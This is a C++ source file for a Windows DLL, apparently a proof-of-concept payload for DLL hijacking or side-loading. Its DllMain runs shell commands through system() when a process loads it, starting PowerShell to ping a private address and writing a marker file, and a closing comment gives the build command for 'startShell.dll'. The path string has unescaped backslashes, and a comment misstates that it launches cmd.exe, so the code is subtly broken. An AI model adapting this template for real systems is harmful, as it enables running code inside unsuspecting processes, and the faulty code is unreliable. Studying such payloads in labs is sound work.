#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            int i;

            // This command will launch a new instance of cmd.exe (Command Prompt)
            i = system ("start powershell -Command \"ping 192.168.45.224\"");

            // Adding the command to create a log.txt file
            i = system ("echo DLL_PROCESS_ATTACH > C:\\Users\Public\log.txt");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            // We can also add logs for this event as well if needed.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            // We can also add logs for this event as well if needed.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            // We can also add logs for this event as well if needed.
        break;
    }
    return TRUE;
}
//x86_64-w64-mingw32-gcc startShell.cpp --shared -o startShell.dll
